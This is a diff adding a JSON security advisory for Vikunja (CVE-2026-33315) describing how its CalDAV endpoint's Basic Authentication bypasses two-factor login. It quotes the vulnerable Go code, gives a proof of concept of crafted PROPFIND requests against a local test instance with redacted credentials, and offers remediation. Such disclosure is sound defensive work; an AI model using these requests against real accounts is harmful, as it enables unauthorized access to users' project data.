@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-47cr-f226-r4pq",
+  "modified": "2026-03-25T21:04:24.696586Z",
+  "published": "2026-03-20T17:25:35Z",
+  "aliases": [
+    "CVE-2026-33315",
+    "GO-2026-4794"
+  ],
+  "summary": "Vikunja has a 2FA Bypass via Caldav Basic Auth",
+  "details": "### Summary\nThe Caldav endpoint allows login using Basic Authentication, which in turn allows users to bypass the TOTP on 2FA-enabled accounts. The user can then access standard project information that would normally be protected behind 2FA (if enabled), such as project name, description, etc.\n\n### Details\nThe two files below show that when a user is accessing Caldav via Basic Authentication, it skips all steps involving 2FA. The order of operations is essentially:\n1. Retrieve basic credentials.\n2. Verify username.\n3. Verify password.\n4. Success\n\n**pkg/routes/caldav/auth.go:45**\n```go\nu, err := checkUserCaldavTokens(s, credentials)\n\tif user.IsErrUserDoesNotExist(err) {\n\t\treturn false, nil\n\t}\n\tif u == nil {\n\t\tu, err = user.CheckUserCredentials(s, credentials)\n\t\tif err != nil {\n\t\t\tlog.Errorf(\"Error during basic auth for caldav: %v\", err)\n\t\t\treturn false, nil\n\t\t}\n\t}\n```\n\n**pkg/user/user.go:358**\n```go\nfunc CheckUserCredentials(s *xorm.Session, u *Login) (*User, error) {\n\t// Check if we have any credentials\n\tif u.Password == \"\" || u.Username == \"\" {\n\t\treturn nil, ErrNoUsernamePassword{}\n\t}\n\n\t// Check if the user exists\n\tuser, err := getUserByUsernameOrEmail(s, u.Username)\n\tif err != nil {\n\t\t// hashing the password takes a long time, so we hash something to not make it clear if the username was wrong\n\t\t_, _ = bcrypt.GenerateFromPassword([]byte(u.Username), 14)\n\t\treturn nil, ErrWrongUsernameOrPassword{}\n\t}\n\n\tif user.Issuer != IssuerLocal {\n\t\treturn user, \u0026ErrAccountIsNotLocal{UserID: user.ID}\n\t}\n\n\t// The user is invalid if they need to verify their email address\n\tif user.Status == StatusEmailConfirmationRequired {\n\t\treturn \u0026User{}, ErrEmailNotConfirmed{UserID: user.ID}\n\t}\n\n\t// Check the users password\n\terr = CheckUserPassword(user, u.Password)\n\tif err != nil {\n\t\tif IsErrWrongUsernameOrPassword(err) {\n\t\t\thandleFailedPassword(user)\n\t\t}\n\t\treturn user, err\n\t}\n\n\treturn user, nil\n}\n```\n\n### PoC\n1. Setup a Docker instance of Vikunja `v2.1.0` and create an account. Enable 2FA on the account.\n\u003cimg width=\"1506\" height=\"646\" alt=\"CleanShot 2026-03-16 at 15 30 24@2x\" src=\"https://github.com/user-attachments/assets/e88522af-4333-4758-8ba4-3e34de9680f7\" /\u003e\n\n2. Logout of the account.\n3. Using a web proxy, such as Burp Suite, craft an HTTP request to the endpoint similar to the one shown below. Ensure that the 2FA-enabled user's username and password is properly Base64-encoded and inserted into the `Authorization` header.\n\n```http\nPROPFIND /dav/principals/ HTTP/1.1\nHost: 127.0.0.1:3456\nAuthorization: Basic {{ REDACTED }}\n[ TRUNCATED ]\n\n\u003c?xml version=\"1.0\"?\u003e\u003cd:propfind xmlns:d=\"DAV:\"\u003e\u003cd:prop\u003e\u003cd:displayname/\u003e\u003cd:resourcetype/\u003e\u003c/d:prop\u003e\u003c/d:propfind\u003e\n```\n5. Observe that the response contains authenticated user information.\n```http\nHTTP/1.1 207 Multi-Status\nContent-Type: text/xml; charset=utf-8\nVary: Accept-Encoding\nDate: Mon, 16 Mar 2026 19:31:47 GMT\nContent-Length: 398\n\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cD:multistatus xmlns:D=\"DAV:\" xmlns:C=\"urn:ietf:params:xml:ns:caldav\" xmlns:CS=\"http://calendarserver.org/ns/\"\u003e\u003cD:response\u003e\u003cD:href\u003e/dav/projects\u003c/D:href\u003e\u003cD:propstat\u003e\u003cD:prop\u003e\u003cD:displayname\u003eprojects\u003c/D:displayname\u003e\n[ TRUNCATED ]\n```\n6. Other requests can then be crafted to retrieve more information about a specific project, such as the one below.\n```http\nPROPFIND /dav/projects/1/{{ PROJECT NAME }}/ HTTP/1.1\nHost: 127.0.0.1:3456\nAuthorization: Basic [ REDACTED ]\n[TRUNCATED]\n\n\u003c?xml version=\"1.0\"?\u003e\u003cc:calendar-query xmlns:d=\"DAV:\" xmlns:c=\"urn:ietf:params:xml:ns:caldav\"\u003e\u003cd:prop\u003e\u003cd:getetag/\u003e\u003cc:calendar-data/\u003e\u003c/d:prop\u003e\u003cc:filter\u003e\u003cc:comp-filter name=\"VCALENDAR\"\u003e\u003cc:comp-filter name=\"VTODO\"/\u003e\u003c/c:comp-filter\u003e\u003c/c:filter\u003e\u003c/c:calendar-query\u003e\n```\n\n```http\nHTTP/1.1 207 Multi-Status\nContent-Type: text/xml; charset=utf-8\n[ TRUNCATED ]\n\n[ TRUNCATED ]\n\u003cD:prop\u003e\u003cC:calendar-data\u003eBEGIN:VCALENDAR\u0026#xA;VERSION:2.0\u0026#xA;X-PUBLISHED-TTL:PT4H\u0026#xA;X-WR-CALNAME:Inbox\u0026#xA;PRODID:-//Vikunja Todo App//EN\u0026#xA;BEGIN:VTODO\u0026#xA;UID:8gb6eclz-dad5-4a38-80a8-09005707eb51\u0026#xA;DTSTAMP:20260316T190905Z\u0026#xA;SUMMARY:test\u0026#xA;DESCRIPTION:\u0026lt;p\u0026gt;description\u0026lt;/p\u0026gt;\u0026#xA;CREATED:20260301T203712Z\u0026#xA;LAST-MODIFIED:20260316T190905Z\u0026#xA;BEGIN:VALARM\u0026#xA;TRIGGER;VALUE=DATE-TIME:20260316T130000Z\u0026#xA;ACTION:DISPLAY\u0026#xA;DESCRIPTION:test\u0026#xA;END:VALARM\u0026#xA;END:VTODO\u0026#xA;END:VCALENDAR\u003c/C:calendar-data\u003e\u003c/D:prop\u003e\u003cD:status\u003eHTTP/1.1 200 OK\n[ TRUNCATED ]\n```\n\n### Impact\nAny user that has 2FA enabled could have it bypassed, allowing attacker access to a lot of the user's project information. \n\n### Remediation\nIf there are 2FA barriers to access an account in a specific fashion, all integrations should follow those if they're using the same methods of authentication. The easiest path is probably to disable Basic Authentication for Caldav by default, but keep the token access enabled, that way users can generate tokens specifically for Caldav if they want to use that feature. Basic Auth for it could be kept, but would most likely want to be a feature flag or something along those lines. That's so users can turn it on if it's necessary, but can be notified in the documentation that it's a more unsafe pattern if 2FA is enabled.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.1.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-47cr-f226-r4pq/GHSA-47cr-f226-r4pq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-47cr-f226-r4pq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33315"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/cdf5d30a425d032f749b78b98b828f25ad882615"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://vikunja.io/changelog/vikunja-v2.2.0-was-released"
+    }
+  ]
+}
